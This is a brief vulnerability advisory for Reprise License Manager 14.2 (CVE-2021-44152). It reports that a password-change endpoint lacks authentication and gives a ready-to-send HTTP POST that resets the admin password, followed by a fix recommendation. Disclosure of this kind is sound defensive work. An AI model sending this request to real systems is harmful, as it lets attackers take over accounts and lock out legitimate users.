# Product: Reprise License Manager 14.2
# Vendor: Reprise Software
# CVE ID: CVE-2021-44152

Introduction:
Because /goform/change_password_process does not verify authentication or authorization, an unauthenticated user can change the password of  any existing user. This allows an attacker to change the password of any known user, thereby preventing valid users from accessing the system and granting the attacker full access to that user's account.

Vulnerability:
If an unauthenticated user sends the following HTTP request they can change the password of any user:

POST /goform/change_password_process HTTP/1.1
Host: 127.0.0.1:5054
Content-Length: 53

pw1=passwd&pw2=passwd&user=admin&ok=CHANGE%2BPASSWORD

Recommendation:
Ensure that authentication is required prior to password change requests and that users cannot modify or change passwords of others users.
